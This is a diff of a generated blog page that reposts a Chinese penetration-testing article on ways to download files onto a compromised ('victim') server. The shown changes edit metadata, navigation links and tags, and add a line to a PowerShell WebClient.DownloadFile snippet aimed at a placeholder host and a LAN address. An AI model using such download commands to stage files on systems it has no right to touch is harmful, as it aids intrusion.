@@ -8,19 +8,19 @@
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
   <title>十三种方式下载文件 | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 1234$p = New-Object System.Net.WebClient$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)如：$p.Down">
+  <meta name="description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 12345$p = New-Object System.Net.WebClient$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)如：$p.Dow">
 <meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
 <meta property="og:title" content="十三种方式下载文件">
 <meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/10/04/十三种方式下载文件/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 1234$p = New-Object System.Net.WebClient$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)如：$p.Down">
+<meta property="og:description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 12345$p = New-Object System.Net.WebClient$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)如：$p.Dow">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png">
-<meta property="og:updated_time" content="2019-10-04T04:21:36.491Z">
+<meta property="og:updated_time" content="2019-10-13T07:17:24.040Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="十三种方式下载文件">
-<meta name="twitter:description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 1234$p = New-Object System.Net.WebClient$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)如：$p.Down">
+<meta name="twitter:description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 12345$p = New-Object System.Net.WebClient$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)如：$p.Dow">
 <meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
@@ -162,7 +162,7 @@
         <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
 <p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
 <h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
 <p>执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
 <p>如果Powershell禁止执行了，使用如下命令：</p>
@@ -323,18 +323,18 @@
   
 <nav id="article-nav">
   
-    <a href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/Knlvre.github-io/2019/10/04/Linux 提权常用命令集/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Windows系统添加补丁
+          Linux 提权常用命令集
         
       </div>
     </a>
   
   
-    <a href="/Knlvre.github-io/2019/10/04/Linux 提权常用命令集/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Linux 提权常用命令集</div>
+    <a href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Windows系统添加补丁</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -460,7 +460,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -468,7 +468,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
